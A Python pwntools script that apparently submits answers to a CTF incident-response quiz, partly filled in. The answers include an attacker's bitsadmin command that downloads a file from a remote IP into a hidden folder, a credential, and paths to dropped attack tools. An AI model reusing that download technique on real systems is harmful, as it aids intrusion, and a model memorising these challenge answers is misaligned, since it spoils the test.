from pwn import *

# Set up logging
context.log_level = "info"


def solve():
    # Connection details
    host = "gzcli.ctf.cyberjawara.id"
    port = 62051

    # Connect to the server
    r = remote(host, port)

    # Array of answers.
    # REPLACE the placeholders with the real answers.
    answers = [
        # Question 1
        "https://cybersharing.net/api/download/file/8bd5ce87-b1d2-45a8-be68-03bc664ab068/7f203a93-4619-40f8-93c4-e075eb4d39dd/ea62a809-a93b-4a89-bfe1-33247f5058f8/AnsiArtInstaller.exe_AnsiArtInstaller.exe_12/21/2025 11:14:31 PM",
        # Question 2
        "12/21/2025 11:15:10 PM",
        # Question 3
        "ansi_art.exe,program.banner",
        # Question 4
        "C:\\Users\\Administrator\\AppData\\Local\\Temp",
        # Question 5
        "C:\\Users\\Administrator\\Desktop\\AnsiArt.lnk",
        # Question 6
        "192.168.100.157:443",
        # Question 7
        "http://192.168.100.157:8082",
        # Question 8
        "C:\\h1dd3n",
        # Question 9
        '"C:\\Windows\\system32\\bitsadmin.exe" /Transfer jarangoyang /priority foreground http://192.168.100.157:8082/SDelete.zip C:\\h1dd3n\\sadewa.zip',
        # Question 10
        "ipconfig",
        # Question 11
        "as3ng_AsengCupu123!",
        # Question 12
        "administrators,Remote Desktop Users",
        # Question 13
        "12/22/2025 12:02 AM",
        # Question 14
        "C:\\h1dd3n\\mimiperi.exe",
        # Question 15
        "C:\\h1dd3n\\sassy.exe",
        # Question 16
        "\\85985985-ddfa-430b-bf04-fc33fcfdc881\\pipe\\epmapper",
        # Question 17
        "C:\\h1dd3n\\kucing.exe",
        # Question 18
        "759dc18c8dc3da48de6ad66d2070b7cb",
        # Question 19
        "REPLACE_WITH_ANSWER_19",
        # Question 20
        "REPLACE_WITH_ANSWER_20",
        # Question 21
        "REPLACE_WITH_ANSWER_21",
        # Question 22
        "REPLACE_WITH_ANSWER_22",
        # Question 23
        "REPLACE_WITH_ANSWER_23",
        # Question 24
        "REPLACE_WITH_ANSWER_24",
        # Question 25
        "REPLACE_WITH_ANSWER_25",
    ]

    for i, answer in enumerate(answers):
        log.info(f"Waiting for Question {i+1}...")

        # Read until asking for input
        # The prompt ends with "Answer: "
        try:
            received = r.recvuntil(b"Answer: ").decode()
            print(received)
        except EOFError:
            log.error("Connection closed unexpectedly.")
            break

        if "REPLACE_WITH_ANSWER" in answer:
            log.warning(
                f"Answer for Question {i+1} is missing! Switching to interactive mode so you can enter it manually or check the question."
            )
            r.interactive()
            break

        log.info(f"Sending answer for Question {i+1}: {answer}")
        r.sendline(answer.encode())

        # Optional: Check for "Correct!" confirmation if needed, but the next loop's recvuntil will usually catch the output anyway.
        # received_response = r.recvline().decode()
        # print(received_response)

    # If we finish the loop
    r.interactive()


if __name__ == "__main__":
    solve()
